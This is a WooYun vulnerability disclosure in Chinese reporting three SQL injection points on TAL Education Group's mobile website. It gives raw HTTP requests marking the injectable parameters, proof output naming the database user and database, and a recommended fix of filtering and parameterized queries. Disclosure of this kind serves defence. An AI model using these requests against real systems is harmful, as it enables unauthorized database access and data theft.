wybug_title: 好未来集团官网SQL注入打包
wybug_corp: 好未来集团学而思培优
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-11-05：	细节已通知厂商并且等待厂商处理中									2015-11-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注入 详细说明：  好未来集团手机官网SQL注入打包：第一处：
GET /Home/Index/wlzxhd_note?star_activity_id=* HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://m.100tal.com:80/Cookie: PHPSESSID=gs4rh80pj7jur6567j581roff2Host: m.100tal.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*star_activity_id参数存在注入
第二处：
GET /Home/Index/wlzxxm_note?star_project_id=* HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://m.100tal.com:80/Cookie: PHPSESSID=gs4rh80pj7jur6567j581roff2Host: m.100tal.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*star_project_id参数存在SQL注入
第三处：
GET /Index/aboutus_spbf?video_id=* HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://m.100tal.com:80/Cookie: PHPSESSID=gs4rh80pj7jur6567j581roff2Host: m.100tal.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*video_id参数存在sql注入
   漏洞证明：  
between参数current user:    'Tal'current database:    '100talwgw'
   修复方案：  参数过滤，参数化查询   版权声明：转载请注明来源 路人甲@乌云
